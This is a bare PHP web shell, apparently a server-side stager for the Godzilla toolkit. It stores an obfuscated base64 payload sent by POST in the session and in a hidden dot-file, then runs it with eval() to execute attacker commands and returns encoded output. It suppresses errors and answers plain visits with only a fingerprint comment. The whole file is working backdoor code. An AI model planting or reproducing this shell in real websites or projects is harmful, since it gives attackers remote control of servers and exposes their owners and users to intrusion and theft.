<?php
@error_reporting(0);@set_time_limit(0);
$_p='pass';
$_k=substr(md5('key'),0,16);
$_sk='pl_1a1dc91c';
$_tf=dirname(__FILE__).DIRECTORY_SEPARATOR.'.pl_1a1dc91c';
if(!function_exists('mr6d')){function mr6d($d){return base64_decode(strtr($d,array('|'=>'a','!'=>'b','@'=>'c','_'=>'d')));}}
if(!function_exists('mr6e')){function mr6e($d){return strtr(base64_encode($d),array('a'=>'|','b'=>'!','c'=>'@','d'=>'_'));}}
if(!isset($_POST['data'])){echo '<!-- mr6:'.substr(md5($_p.$_k),0,8).' -->';exit;}
$_raw=mr6d($_POST['data']);
$_store=null;
@session_start();
if(isset($_SESSION[$_sk]))$_store=$_SESSION[$_sk];
elseif(@file_exists($_tf))$_store=@file_get_contents($_tf);
if($_store===null){
  if(strlen($_raw)>5000||strpos($_raw,'GodzillaZeroBasicInfo')!==false){
    $_SESSION[$_sk]=$_raw;
    @file_put_contents($_tf,$_raw);
  }
}else{
  $_pl=$_store;
  @eval('/*'.$_p.'*/'.$_pl.'');
  echo substr(md5($_p.$_k),0,16);
  echo mr6e(@run($_raw));
  echo substr(md5($_p.$_k),16);
}
?>